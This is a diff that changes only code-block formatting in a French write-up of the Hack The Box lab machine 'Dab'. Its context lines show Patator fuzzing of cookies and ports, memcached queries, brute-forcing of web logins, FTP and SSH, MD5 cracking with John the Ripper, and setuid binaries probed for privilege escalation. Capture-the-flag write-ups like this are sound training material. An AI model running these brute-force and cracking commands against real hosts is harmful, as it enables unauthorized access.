@@ -15,7 +15,7 @@ Non évidemment le nom de la box provient plutôt [des mouvements de bras](https
 
 Cette machine dispose d'un serveur FTP, un SSH ainsi que deux serveurs web :  
 
-```plain
+```
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 3.0.3
 |_banner: 220 (vsFTPd 3.0.3)
@@ -54,7 +54,7 @@ Bref c'est le moment de patater !
 
 Premièrement essayons de retrouver le nom du cookie attendu :  
 
-```plain
+```
 $ patator http_fuzz url='http://10.10.10.86:8080/' header='Cookie: FILE0=nawak;' 0=common_query_parameter_names.txt  -x ignore:clen=322
 13:42:13 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-12 13:42 CET
 13:42:13 patator    INFO -
@@ -68,7 +68,7 @@ Access denied: password authentication cookie incorrect
 
 J'avoue qu'on aurait pu le trouver tout seul celui-ci. Continuons avec la valeur possible :  
 
-```plain
+```
 $ patator http_fuzz url='http://10.10.10.86:8080/' header='Cookie: password=FILE0;' 0=common_query_parameter_names.txt  -x ignore:clen=324
 13:45:18 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-12 13:45 CET
 13:45:18 patator    INFO -
@@ -94,7 +94,7 @@ On se retrouve alors sur un formulaire permettant d'envoyer des données vers un
 
 On peut aussi passer une plage numérique à Patator :  
 
-```plain
+```
 $ patator http_fuzz url='http://10.10.10.86:8080/socket?port=RANGE0&cmd=hello' header='Cookie: password=secret;' 0=int:0-65535  -x ignore:code=500
 10:20:29 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-13 10:20 CET
 10:20:29 patator    INFO -
@@ -115,7 +115,7 @@ Sur [cet article](http://niiconsulting.com/checkmate/2013/05/memcache-exploit/) 
 
 Ainsi en envoyant *stats items* j'ai le retour suivant :  
 
-```plain
+```
 STAT items:16:number 1
 STAT items:16:age 1024
 STAT items:16:evicted 0
@@ -151,7 +151,7 @@ Malheureusement les commandes *get users* et *get stock* ne semblaient rien remo
 
 J'ai donc décidé de revenir sur le port 80 pour brute-forcer les noms d'utilisateurs possibles :  
 
-```plain
+```
 $ patator http_fuzz url='http://10.10.10.86/login' method=POST body='username=FILE0&password=nawak&submit=Login' 0=top500.txt -x ignore:clen=543
 15:26:03 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-12 15:26 CET
 15:26:03 patator    INFO -
@@ -180,7 +180,7 @@ L'output étant trop important je ne le posterais pas ici mais la clé est en r�
 
 Je n'ai pas gardé le script pour convertir le JSON en des lignes prêtes pour JTR mais ça pourrait se faire en one-liner pour toute personne maîtrisant bien Python.  
 
-```plain
+```
 $ john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt
 Loaded 495 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 12x])
 Warning: poor OpenMP scalability for this hash type, consider --fork=4
@@ -202,7 +202,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 *Patator* est toujours à l'aise que ce soit en FTP :  
 
-```plain
+```
 $ patator ftp_login user=COMBO00 password=COMBO01 0=combo.txt host=10.10.10.86 -t 1 --rate-limit=5
 09:59:11 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-13 09:59 CET
 09:59:11 patator    INFO -
@@ -225,7 +225,7 @@ $ patator ftp_login user=COMBO00 password=COMBO01 0=combo.txt host=10.10.10.86 -
 
 ou en SSH :  
 
-```plain
+```
 $ patator ssh_login user=COMBO00 password=COMBO01 0=combo.txt host=10.10.10.86 -t 1 --rate-limit=5
 10:25:22 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-13 10:25 CET
 10:25:22 patator    INFO -
@@ -341,7 +341,7 @@ Vous allez me dire que pour que les changements soient pris en compte il faut au
 
 Et comme si ça ne suffisait pas on trouve ce fichier dans le même dossier :  
 
-```plain
+```
 -rw-r--r-- 1 root root 5 Mar 25  2018 test.conf
 ```
 
@@ -358,7 +358,7 @@ Il faut maintenant trouver des binaires setuid que l'on peut cibler pour notre a
 
 Il y a un exécutable baptisé *try\_harder* :  
 
-```plain
+```
 genevieve@dab:~$ ldd /usr/bin/try_harder
     linux-vdso.so.1 =>  (0x00007fff149d7000)
     libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe54d39e000)
@@ -373,7 +373,7 @@ De plus le binaire est protégé via stack-protector et le *fgets* ne prend pas 
 
 En revanche il y a un autre binaire qui ne m'a pas sauté immédiatement aux yeux et qui fait appel à une librairie custom :  
 
-```plain
+```
 genevieve@dab:~$ ldd /usr/bin/myexec
     linux-vdso.so.1 =>  (0x00007ffe415cd000)
     libseclogin.so => /usr/lib/libseclogin.so (0x00007f4cc9f39000)
